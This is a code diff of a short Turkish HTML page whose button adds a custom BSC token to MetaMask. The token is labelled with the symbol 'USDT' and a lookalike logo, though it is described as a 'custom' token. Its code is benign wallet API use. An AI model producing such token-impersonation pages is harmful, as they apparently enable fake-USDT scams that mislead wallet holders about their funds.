@@ -5,48 +5,54 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Özel USDT Token</title>
 </head>
+
 <body>
 
-<h2>Özel Tokenı MetaMask'a Ekle</h2>
+    <h2>Özel USDT Token</h2>
 
-<button onclick="addToken()">
-    Tokenı MetaMask'a Ekle
-</button>
+    <p>
+        Bu sayfa, özel BSC tokenını MetaMask'a eklemek için kullanılır.
+    </p>
 
-<script>
-async function addToken() {
+    <button onclick="addToken()">
+        Tokenı MetaMask'a Ekle
+    </button>
 
-    if (typeof window.ethereum === "undefined") {
-        alert("MetaMask bulunamadı.");
-        return;
-    }
+    <script>
+        async function addToken() {
 
-    try {
-        const wasAdded = await window.ethereum.request({
-            method: "wallet_watchAsset",
-            params: {
-                type: "ERC20",
-                options: {
-                    address: "0xf1CA95B3f5d7c4A71A6F5473615Cb2347591A874",
-                    symbol: "USDT",
-                    decimals: 18,
-                    image: "https://raw.githubusercontent.com/hizadem-creator/CUSTOM-USDT-LOGO/main/logo.png"
-                }
+            if (typeof window.ethereum === "undefined") {
+                alert("MetaMask bulunamadı.");
+                return;
             }
-        });
 
-        if (wasAdded) {
-            alert("Token MetaMask'a eklendi.");
-        } else {
-            alert("Token ekleme işlemi iptal edildi.");
+            try {
+
+                const wasAdded = await window.ethereum.request({
+                    method: "wallet_watchAsset",
+                    params: {
+                        type: "ERC20",
+                        options: {
+                            address: "0xf1CA95B3f5d7c4A71A6F5473615Cb2347591A874",
+                            symbol: "USDT",
+                            decimals: 18,
+                            image: "https://raw.githubusercontent.com/hizadem-creator/CUSTOM-USDT-LOGO/main/icons/eip155:56/erc20:0xf1CA95B3f5d7c4A71A6F5473615Cb2347591A874.png"
+                        }
+                    }
+                });
+
+                if (wasAdded) {
+                    alert("Özel token MetaMask'a eklendi.");
+                } else {
+                    alert("Token ekleme işlemi iptal edildi.");
+                }
+
+            } catch (error) {
+                console.error(error);
+                alert("Token eklenirken hata oluştu.");
+            }
         }
-
-    } catch (error) {
-        console.error(error);
-        alert("Token eklenirken hata oluştu.");
-    }
-}
-</script>
+    </script>
 
 </body>
 </html>
